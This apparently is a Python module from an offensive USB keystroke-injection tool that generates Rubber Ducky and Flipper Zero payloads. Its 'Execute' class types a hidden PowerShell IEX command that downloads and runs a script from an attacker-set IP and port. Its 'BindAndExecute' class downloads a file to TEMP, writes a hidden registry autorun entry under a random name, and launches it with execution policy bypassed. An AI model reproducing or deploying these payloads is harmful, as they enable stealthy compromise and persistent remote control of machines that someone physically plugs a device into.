import os
import tempfile
from core.config import *
from core.utils import *

class MissingJava(Exception):
    def __init__(self):
        self.message = "Java is needed to run encoder.jar please install it here: https://www.java.com/download/ie_manual.jsp \n\nPlease restart terminal after installation"
        super().__init__(self.message)

class InvalidPayloadName(Exception):
    def __init__(self, payload_name: str) -> None:
        self.message = f"{payload_name} is not a valid payload please use one of the following (case insensitive) \n{', '.join(PAYLOADS.keys())}"
        super().__init__(self.message)

class USBPayload:
    """
    Ducky/Flipper Payload
    """

    def __build(self) -> bool:
        """ Builds a payload text file
        :return: True if the file was created
        """
        self.path = f"{self.config.CWD}\\payload.txt"
        try:
            os.unlink(self.path)
        except FileNotFoundError:
            pass
        self.temp = open(self.path, "ab+")
        if "START_DELAY_TIME" in self.source:
            self.source = self.source.replace("START_DELAY_TIME", str(self.config.delay))
        for key, line in self.lines.items():
            self.source = self.source.replace(key, line)
        self.temp.seek(0)
        return bool(self.temp.write(self.source.encode()))

    def __encode_payload(self):
        """ Encodes the payload.txt into inject.bin
        1. Requires java
        2. Requires encode.jar
        :return: True if the file was made
        """
        try:
            out = get_output(["java", "-jar", f"encoder.jar", "-i", f"{self.path}", "-l", self.config.keyboard_layout])
            return b"DuckyScript Complete" in out 
        except FileNotFoundError:
            raise MissingJava

    def execute(self) -> bool:
        self.__build()
        if self.config.ducky:
            self.__encode_payload()
        if self.config.flipper:
            self.temp.seek(0)
            make_unix_here(self.temp.read(), self.config.CWD + f"\\{self.config.flipper}")
        self.temp.close()
        return True

    def stop(self):
        if self.temp:
            self.temp.close()

class BindAndExecute(USBPayload):
    def __init__(self, config: Config):
        self.config = config
        self.source = get_file_content(self.config.TEMPLATE_DIR + "advanced-payload.txt")
        self.lines: dict = {
            "KEY1":  f'STRING $WebClient.DownloadFile("http://{self.config.ip_address}:{self.config.server_port}/{self.config.out_file}", "$Env:TEMP\\\\{self.config.out_file}")',
            "KEY2": f'STRING New-ItemProperty -Path $path -Name "{generate_string(12)}" -Value "powershell.exe -WindowStyle hidden -file $Env:TEMP\\\\{self.config.out_file}" -PropertyType "String"',
            "KEY3": f'STRING cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $Env:TEMP\\{self.config.out_file}'
        }

class Execute(USBPayload):
    def __init__(self, config: Config):
        self.config = config
        self.source = get_file_content(self.config.TEMPLATE_DIR + "basic-payload.txt")
        self.lines: dict = {
            "KEY1": f"STRING powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('http://{self.config.ip_address}:{self.config.server_port}/{self.config.out_file}')"
        }

PAYLOADS = {
    "execute": Execute,
    "bindandexecute":BindAndExecute,
}


def fetch(name, config):
    """
    Creates an instance of the payload they selected
    """
    payload = PAYLOADS.get(name.lower())
    if not payload:
        raise InvalidPayloadName(name)
    return payload(config)